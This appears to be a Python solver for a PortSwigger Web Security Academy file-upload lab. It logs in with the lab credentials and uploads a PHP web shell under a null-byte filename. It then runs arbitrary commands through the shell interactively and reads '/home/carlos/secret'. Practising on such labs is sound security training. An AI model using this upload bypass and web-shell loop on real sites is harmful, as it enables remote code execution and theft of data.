import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: Web shell upload via path traversal')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

# GET CSRF AND COOKIE
r = requests.get("https://" + lab.id + ".web-security-academy.net/login")
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
headers = {"Cookie":f"session={r.cookies.get('session')}"}

# AUTH AS WIENER
r = requests.post("https://" + lab.id + ".web-security-academy.net/login", headers=headers, data={"csrf":csrf,"username":"wiener","password":"peter"}, allow_redirects=False)
wiener = r.cookies.get('session')
headers = {"Cookie":f"session={wiener}"}

# UPLOAD WEBSHELL
r = requests.get("https://" + lab.id + ".web-security-academy.net/my-account/", headers=headers)
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
files = {"avatar":('shell.php%00.png', open("shell.php", "rb"))}
r = requests.post("https://" + lab.id + ".web-security-academy.net/my-account/avatar", headers=headers, data={"csrf":csrf,"user":"wiener"}, files=files)

# START PSEUDOSHELL SESSION
command = ""
shell_user = requests.get("https://" + lab.id + f".web-security-academy.net/files/avatars/shell.php?command=whoami").text.split("\n")[0]
hostname = requests.get("https://" + lab.id + f".web-security-academy.net/files/avatars/shell.php?command=hostname").text.split("\n")[0]
while command != "solvechallenge":
    print('TIP: enter "solvechallenge" command to exit and solve the lab.')
    command = input(f"{shell_user}@{hostname}$ ")
    r = set(requests.get("https://" + lab.id + f".web-security-academy.net/files/avatars/shell.php?command={command}").text.split("\n"))
    for i in r:
        print(i, sep="\n")

# SUBMIT SOLUTION
else:
    r = requests.get("https://" + lab.id + f".web-security-academy.net/files/avatars/shell.php?command=cat /home/carlos/secret").text
    secret = r[:len(r)//2]
    requests.post("https://" + lab.id + ".web-security-academy.net/submitSolution?answer=secret", data={"answer":secret})
    
    
try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")
